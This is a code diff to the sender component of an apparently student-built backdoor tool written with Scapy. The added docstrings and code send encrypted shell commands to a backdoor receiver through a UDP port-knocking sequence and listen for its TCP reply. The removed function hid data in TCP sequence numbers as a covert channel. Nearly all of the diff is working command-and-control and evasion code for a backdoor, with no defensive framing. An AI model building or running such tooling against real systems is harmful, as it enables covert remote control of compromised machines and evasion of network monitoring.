@@ -67,6 +67,11 @@ def read_configuration():
 
 
 def start_sender():
+    """
+    Initializes command line UI for attacker to send shell commands to a backdoor receiver.
+    Calls port-knocking and listening for response for each commands sent.
+    :return: None
+    """
     print("Starting Sender. (Type \"exit\" to shutdown)")
 
     # Generate encryption key if needed. Ensure both sender and receiver have same key.
@@ -99,14 +104,29 @@ def start_sender():
             print("Invalid character detected. Must be UTF-8 supported values only.")
             continue
 
+        # Send command with port-knocking.
         send_port_knock_command(user_input, receiver_addr, port1, port2, port3, port_knock_auth)
+        # Listen for backdoor response.
         data_server(IPAddr, sender_port)
 
 
 def send_port_knock_command(message, receiver_addr, port1, port2, port3, port_knock_auth):
+    """
+    Performs port-knocking sequence on the receiver backdoor.
+    UDP packets are sent with auth_string as payload in order to port 1-3 as specified in config file.
+    Command is encrypted and send with final packet in port-knocking sequence.
+    :param message: str of shell command
+    :param receiver_addr: IP address
+    :param port1: int of port
+    :param port2: int of port
+    :param port3: int of port
+    :param port_knock_auth: str used for authentication
+    :return: None
+    """
 
     sport = RandShort()
-    command_payload = port_knock_auth + "|" + message
+    encrypt_msg = encryption.encrypt(message)
+    command_payload = port_knock_auth + "|" + encrypt_msg
 
     # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
     port_knock_1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port1) / Raw(load=port_knock_auth)
@@ -118,6 +138,13 @@ def send_port_knock_command(message, receiver_addr, port1, port2, port3, port_kn
 
 
 def data_server(address, port):
+    """
+    Creates a socket that listens for a single TCP response from the receiver backdoor.
+    Decrypts the data and closes the socket connection.
+    :param address: IP address
+    :param port: int of port
+    :return: None
+    """
     with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as IPv4_sock:
         IPv4_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
         IPv4_sock.bind((address, port))
@@ -134,76 +161,6 @@ def data_server(address, port):
             else:
                 conn.close()
                 break
-
-
-def send_message(message, receiver_addr, port):
-
-    dst = receiver_addr
-    sport = RandShort()
-    dport = 900
-
-    # 3-way-handshake
-    ip = IP(dst=dst)  # ip = IP(dst=dst, frag=0)
-    tcp_syn = ip/TCP(sport=sport, dport=dport, flags='S')
-    tcp_synack = sr1(tcp_syn, verbose=0, timeout=5)
-
-    if tcp_synack is None:
-        print("3-way-handshake failed. No response from receiver.")
-        return
-    tcp_ack = ip / TCP(sport=sport, dport=dport, flags='A', seq=tcp_synack.ack, ack=tcp_synack.seq + 1)
-    send(tcp_ack, verbose=0)
-
-    # Starting to send data.
-    cur_seq = tcp_synack.ack
-    cur_ack = tcp_synack.seq + 1
-
-    data = encryption.encrypt(message.encode("ascii")).decode("ascii")
-    # data = message
-    current_seq = 1000
-    for c in data:
-        if current_seq > 2000000000:
-            current_seq = 0
-        current_seq += 1000
-        stega_seq = current_seq + ord(c)
-
-        tcp_pushack = ip / TCP(sport=sport, dport=dport, flags='PA', seq=stega_seq, ack=cur_ack)
-        send(tcp_pushack, verbose=0)
-        cur_seq = stega_seq
-        # cur_ack = tcp_ack.seq
-        # cur_seq += len(data)
-        # RESPONSE = sr1(ip / PUSHACK / Raw(load=data))
-
-    # Closing TCP connection
-    # start_new_thread(wait_for_fin_ack, (address, ip, sport, dport))
-    tcp_fin = ip / TCP(sport=sport, dport=dport, flags="FA", seq=cur_seq, ack=cur_ack)
-    # tcp_finack = sr1(tcp_fin)
-    send(tcp_fin, verbose=0)
-    # tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=tcp_finack.ack, ack=tcp_finack.seq + 1)
-    tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=cur_seq, ack=cur_ack + 1)
-    send(tcp_lastack, verbose=0)
-    print("Send Complete.")
-
-
-# def wait_for_fin_ack(address, ip, sport, dport):
-#     print("sniffing")
-#     # tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
-#     tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
-#     print("sniffed!")
-#     print(tcp_finack)
-#     ack = tcp_finack[0].payload.payload.ack
-#     seq = tcp_finack[0].payload.payload.seq
-#     print(f"ack {ack}")
-#     print(f"seq {seq}")
-#     tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=ack, ack=seq + 1)
-#     send(tcp_lastack)
-
-    # IPv4 Socket connection to receiver.
-    # with socket(AF_INET, SOCK_STREAM) as sock:
-    #     sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
-    #     sock.connect((address, port))
-    #     sock.sendall(message.encode("utf-8"))
-    #     print(f"Receiver: \tIP = {address}, Port = {port}")
-    #     print(f"Message Sent: \t{message}")
 
 
 if __name__ == "__main__":
